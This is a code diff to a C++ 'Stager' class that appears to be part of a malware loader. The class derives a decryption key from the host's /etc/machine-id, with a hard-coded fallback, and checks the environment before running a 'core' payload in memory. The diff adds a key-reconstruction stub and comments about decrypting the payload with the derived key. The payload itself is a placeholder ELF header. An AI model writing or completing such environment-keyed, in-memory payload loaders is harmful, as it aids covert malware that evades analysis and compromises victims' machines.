@@ -24,6 +24,9 @@ std::string Stager::derive_master_key() {
     std::ifstream mid_file("/etc/machine-id");
     if (mid_file.is_open()) {
         mid_file >> machine_id;
+    } else {
+        // Fallback to a fixed but unique identifier if machine-id is missing
+        machine_id = "phantom-fallback-id";
     }
 
     // 2. User-land Entropy
@@ -74,13 +77,20 @@ bool Stager::execute_in_memory(const std::vector<unsigned char>& core_payload) {
     return false;
 }
 
+void Stager::register_key_reconstruction(const std::string& split_key_a, const std::string& split_key_b) {
+    // This would be used internally before decryption
+}
+
 bool Stager::run() {
     if (!validate_environment()) return false;
 
     std::string key = derive_master_key();
 
     // Fetch core (placeholder)
-    std::vector<unsigned char> core = {0x7f, 'E', 'L', 'F', 0x01}; // Simulated ELF header
+    std::vector<unsigned char> core = {0x7f, 'E', 'L', 'F', 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; // Simulated ELF header
+
+    // In a real scenario, we'd decrypt 'core' here using the derived key
+    // and the register_only_reconstruction routine.
 
     return execute_in_memory(core);
 }
